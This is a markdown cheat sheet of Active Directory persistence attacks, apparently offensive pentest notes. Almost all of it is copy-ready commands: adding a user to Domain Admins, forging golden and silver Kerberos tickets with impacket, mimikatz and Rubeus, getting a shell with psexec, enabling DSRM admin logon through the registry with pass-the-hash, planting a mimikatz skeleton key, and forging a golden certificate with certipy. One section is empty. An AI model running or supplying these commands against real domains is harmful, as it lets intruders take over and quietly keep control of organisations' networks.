# Persistence AD

## Add user to domain

```cmd
net group "Domain Admins" attackerUser /add /domain
```

## Golden Ticket

### Linux

```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

### Windows

```powershell
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```

## Silver Ticket

### Linux

```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache 
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```

### Windows

```powershell
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```

## DSRM

Domain Persistence: DSRM (Domain Services Restore Mode) refers to a technique used by attackers to maintain access to an Active Directory environment even after security measures or updates have been implemented. DSRM is a special boot mode for a Windows domain controller, which allows an administrator to recover or repair a damaged Active Directory. Attackers, having obtained access to DSRM credentials (which are distinct from regular domain administrator credentials), can use these to authenticate on the domain controller even if other accounts have been cleansed or reset.

> DSRM passwords are changed regularly at least once a month.

```powershell
# Check if key exists
Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour'

# If key exists and value is not set to 2
Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour' -Value 2 -Verbose

# If key does not exist then create it
New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour' -Value 2 -PropertyType DWORD -Verbose
# And you can PTH with Mimikatz
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```

## Skeleton Key

```powershell
mimikatz.exe "privilege::debug" "misc::skeleton" "exit" #password is mimikatz
```

## Custom SSP 

## Golden Certificate

```bash
certipy ca -backup -ca '<ca name>' -u user@domain.com -p password
# get pfx 
certipy forge -ca -pfx <ca private key> -upn user@domain.com -subject 'CN=user,CN=Users,DC=domain,DC=com'
```

## References

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#silver-ticket
- https://www.hackingarticles.in/domain-persistence-dsrm/
- https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/persistence/dsrm
- https://pentestlab.blog/2021/11/15/golden-certificate/
- https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/